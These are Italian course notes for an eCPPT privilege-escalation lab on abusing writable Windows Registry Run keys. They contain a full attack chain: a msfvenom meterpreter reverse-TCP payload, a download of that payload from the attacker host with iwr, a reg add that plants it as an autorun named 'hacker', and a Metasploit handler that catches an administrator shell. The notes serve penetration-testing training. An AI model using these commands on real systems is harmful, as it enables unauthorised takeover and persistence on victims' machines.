# 09 — Privilege Escalation via Registry AutoRuns (Privilege Escalation)

> **Modulo:** Privilege Escalation · **Video:** 9/19
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [09_Privilege Escalation via Registry AutoRuns.txt](09_Privilege Escalation via Registry AutoRuns.txt) · [09_Privilege Escalation via Registry AutoRuns.srt](09_Privilege Escalation via Registry AutoRuns.srt)

## Concetti chiave

- Un **Registry AutoRun** è una chiave di registro che configura un programma o script ad essere eseguito automaticamente al verificarsi di eventi specifici: **system startup**, **user login**, **service initialization**.
- Il programma in autorun viene eseguito con i privilegi dell'utente che fa login (o di SYSTEM se è un service) → se un utente low-priv può **scrivere** nella chiave, può fare privilege escalation.
- Due varianti di sfruttamento:
  1. **Sovrascrivere l'executable** di un autorun esistente (se abbiamo write sul file).
  2. **Creare una nuova entry** nella chiave Run (se abbiamo write sulla chiave registry) puntando al nostro payload.
- Risultato del lab: lo `student` ha **FullControl** su `HKLM\..\Run` → crea autorun "hacker" → l'admin fa login → meterpreter come Administrator.

## Spiegazione approfondita

### Chiavi registry coinvolte

| Chiave | Scopo | Privilegi del programma |
|---|---|---|
| `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` | Esegue al **system startup** per tutti gli utenti | Privilegi dell'utente che fa logon |
| `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` | Esegue al **logon dell'utente corrente** | Privilegi dell'utente |
| `HKLM\SYSTEM\CurrentControlSet\Services` | Configurazione **servizi** Windows | Spesso `NT AUTHORITY\SYSTEM` |
| `...\Run`, `...\RunOnce`, `...\RunOnceEx` | Varianti (RunOnce viene eseguita una sola volta e poi rimossa) | Idem |

### Metodologia

1. **Identificare** un autorun e la sua chiave registry → tool **Autoruns** (Sysinternals) oppure `PowerUp` / `accesschk`.
2. **Verificare i permessi** sulla chiave registry e sul file eseguibile (`Get-Acl`).
3. **Sfruttare**:
   - Se write sull'exe → sovrascrivi con payload.
   - Se write sulla chiave → crea nuovo string value che punti al tuo payload.
4. **Trigger**: aspettare reboot o login del target user privilegiato.

### Scenario del lab

- Macchine: Attacker Windows (`student`, low-priv) + Target Windows (`administrator` via RDP) + Kali.
- Sul target gira **HFS — HTTP File Server** come autorun.
- Tool **Autoruns.exe** mostra che HFS è in `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` → quindi runs at system startup.
- `Get-Acl` sulla chiave: `student` ha **FullControl** → si può modificare/aggiungere.
- `Get-Acl` su `C:\Program Files\HTTP Server` → solo `BUILTIN\Users : ReadAndExecute` → NON si può sovrascrivere l'exe esistente.
- → Si va con la **variante 2**: nuova entry nella chiave Run.

### Catena di sfruttamento

1. `regedit` → tasto destro su `Run` → **New → String Value** → nome `hacker`.
2. Genera payload con `msfvenom`:
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<KALI> LPORT=4444 -f exe -o program.exe
   ```
3. Avvia handler `multi/handler` in MSF.
4. Hosting via `python -m SimpleHTTPServer 80`.
5. Su target scarica con `Invoke-WebRequest`:
   ```powershell
   iwr -UseBasicParsing -Uri "http://<KALI>/program.exe" -OutFile "C:\Users\student\Desktop\tool\program.exe"
   ```
6. Modifica il valore della string `hacker` → path completo a `C:\Users\student\Desktop\tool\program.exe`.
7. Simula login admin: `shutdown /l` o disconnect RDP + reconnect.
8. Autorun eseguito al logon admin → meterpreter come `administrator`.

## Comandi & strumenti

| Comando | Scopo |
|---|---|
| `Autoruns.exe` (Sysinternals) | GUI per enumerare TUTTI gli autoruns (registry, scheduled tasks, services, drivers, ecc.) |
| `Get-Acl "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" \| Format-List` | Verifica permessi sulla chiave Run |
| `Get-Acl "C:\Program Files\...\exe" \| Format-List` | Verifica permessi sull'eseguibile autorun |
| `regedit` | Editor registry GUI per creare/modificare String Value |
| `reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"` | Enumera autorun via CLI |
| `reg add "HKLM\..\Run" /v hacker /t REG_SZ /d "C:\path\payload.exe"` | Aggiungi autorun via CLI |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=.. LPORT=.. -f exe -o program.exe` | Genera payload |
| `iwr -UseBasicParsing -Uri ... -OutFile ...` | Download payload con PowerShell |
| `python -m SimpleHTTPServer 80` | Web server per delivery |
| `use exploit/multi/handler` (msf) | Listener meterpreter |
| `shutdown /l` | Logoff dell'utente corrente (trigger logon successivo) |

## Esempi pratici

```powershell
# 1. Enumerazione (low-priv come student)
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-Acl "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" | Format-List
# Cerca: NT AUTHORITY\student FullControl

# 2. Verifica se possiamo sovrascrivere l'exe esistente
Get-Acl "C:\Program Files\HTTP Server" | Format-List
# Se solo ReadAndExecute → vai sulla creazione di nuovo autorun

# 3. Creazione tool dir e download payload
mkdir C:\Users\student\Desktop\tool
iwr -UseBasicParsing -Uri "http://10.10.22.2/program.exe" `
    -OutFile "C:\Users\student\Desktop\tool\program.exe"

# 4. Aggiunta autorun via CLI (alternativa al regedit GUI)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
    /v hacker /t REG_SZ `
    /d "C:\Users\student\Desktop\tool\program.exe" /f
```

```bash
# Sul Kali — generation + listener + web server
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.22.2 LPORT=4444 -f exe -o program.exe
python -m SimpleHTTPServer 80    # delivery

msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.22.2
set LPORT 4444
exploit
# → meterpreter come 'administrator' quando admin si logga
```

## Punti d'attenzione per l'esame eCPPT

- **Memorizza le 3 chiavi**: `HKLM\..\Run` (startup, tutti gli utenti), `HKCU\..\Run` (logon current user), `HKLM\SYSTEM\CurrentControlSet\Services` (servizi).
- **Varianti**: `Run`, `RunOnce` (eseguita una sola volta poi cancellata), `RunOnceEx`. Anche `HKLM\..\Winlogon\Userinit` e `Shell`.
- **Due check distinti**: permessi sulla **chiave registry** (`Get-Acl HKLM:\...`) e permessi sul **file exe** (`Get-Acl "C:\..."`). Anche solo uno dei due è sufficiente per privesc.
- **Privilegi del payload = privilegi dell'utente che triggera l'autorun**. Se è in `HKLM\..\Run` e l'admin fa logon → admin. Se è un servizio → SYSTEM.
- **Trigger necessario**: serve reboot o logon → non è instant. Pazienza in scenari reali.
- **Differenza vs Insecure Service Permissions (video 08)**: là si modifica il binPath di un service che gira come SYSTEM. Qui si gioca su autorun che girano al logon.
- **PowerUp** identifica weak registry permissions su autoruns automaticamente (`Invoke-PrivescAudit`).
- **OPSEC**: AutoRuns crea evidenza persistente nel registry → spesso usato anche come **persistence**, non solo privesc.

## Collegamenti con altri video

- Precedente: [[08_Exploiting Insecure Service Permissions]] — tecnica simile ma su servizi.
- Prossimo: [[010_ Access Token Impersonation]]
- Tool che automatizza il rilevamento: [[03_Privilege Escalation with PowerUp]] (`Invoke-PrivescAudit` include weak registry check).
- Credenziali in WinLogon (registry vicino): [[03_Privilege Escalation with PowerUp]].
- Persistence via stesso meccanismo: tecnica MITRE T1547.001 — *Registry Run Keys / Startup Folder*.
